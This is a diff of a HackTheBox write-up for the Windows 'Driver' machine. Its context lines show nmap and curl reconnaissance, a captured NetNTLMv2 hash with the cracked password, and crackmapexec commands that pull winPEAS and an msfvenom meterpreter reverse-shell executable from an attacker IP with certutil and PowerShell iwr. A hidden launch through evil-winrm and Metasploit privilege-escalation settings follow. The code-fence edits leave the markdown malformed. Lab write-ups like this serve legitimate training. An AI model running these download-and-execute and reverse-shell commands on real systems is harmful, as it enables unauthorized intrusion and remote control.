@@ -5,7 +5,7 @@ categories: [HackTheBox Writeups]
 tags: [hackthebox, windows]
 ---
 
-```
+```bash
 ares@legion:~$ sudo nmap -sV -A -T4 $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 21:20 EET
 Nmap scan report for 10.10.11.106 (10.10.11.106)
@@ -52,8 +52,7 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 57.48 seconds
 
-```
-
+```bash
 ```
 ares@legion:~$ curl -v http://$target 2>&1                                                                                                                                    
 *   Trying 10.10.11.106:80...
@@ -76,7 +75,7 @@ ares@legion:~$ curl -v http://$target 2>&1
 
 * Connection #0 to host 10.10.11.106 left intact
 Invalid Credentials   
-```
+```bash
 admin:admin
 
 upload revshell.php failed
@@ -94,7 +93,7 @@ ares@legion:~/HackTheBox/Driver$ hashid hash
 Analyzing 'tony::DRIVER:aaaaaaaaaaaaaaaa:65f80c314a5eaee99e365b20b266595c:0101000000000000802e47e3e850dc01cf76c820b582908000000000010010007400480077005900560066007400760003001000740048007700590056006600740076000200100047006d004900720041004a00630079000400100047006d004900720041004a006300790007000800802e47e3e850dc010600040002000000080030003000000000000000000000000020000008c65fd18f1254d420738fb9a48c75cbfa10789f8b75898774d6d0bd69db57210a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000'
 [+] NetNTLMv2 
 --End of file 'hash'--               
-```
+```bash
 tony:liltony 
 
 ```
@@ -135,32 +134,26 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
 [*] Config file parsed
 [*] Config file parsed
-```
-
+```bash
 Transfer & run winpeas
 Methods
-```
+```bash
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "copy \\10.10.14.24\share\winPEASany.exe C:\Users\tony\Desktop\winpeas.exe"
-```
- 
+```bash
 ```
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "certutil -urlcache -split -f http://10.10.14.24:8000/winPEASany.exe C:\Users\tony\Desktop\winpeas.exe"
-```
-
-```
+```bash
+```bash
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "powershell -c iwr -uri http://10.10.14.24:8000/winPEAS.exe -outfile C:\Users\tony\Desktop\winpeas.exe"
-```
-
+```bash
 Check transfer
 ```
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "dir C:\Users\tony\Desktop"
-```
-
+```bash
 No ouput from Winpeas
-```
+```bash
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "\\10.10.14.24\share\winPEASany.exe"
-```
-
+```bash
 Read winpeas and Console_history.txt
 ```
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "C:\Users\tony\Desktop\winpeas.exe > C:\Users\tony\Desktop\output.txt 2>&1"
@@ -168,32 +161,26 @@ Read winpeas and Console_history.txt
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "type C:\Users\tony\Desktop\output.txt"
 
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
-
+```bash
 Stageless msfvenom payload:
-```
+```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f exe -o shell2.exe
-```
-
+```bash
 ```
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "certutil -urlcache -split -f http://10.10.14.27:8000/shell2.exe C:\Users\tony\Desktop\shell2.exe"
-```
-
-```
+```bash
+```bash
 bundle exec evil-winrm.rb -i 10.10.11.106 -u tony -p 'liltony'
 
 *Evil-WinRM* PS C:\Users\tony\Desktop> Start-Process .\shell2.exe -WindowStyle Hidden
-```
-
+```bash
  Privesc
 ```
 use multi/recon/local_exploit_suggester
-```
-
-```
+```bash
+```bash
 set payload windows/x64/meterpreter/reverse_tcp 
 set session 1 
 set lhost tun0 
 run
-```
-
+```bash
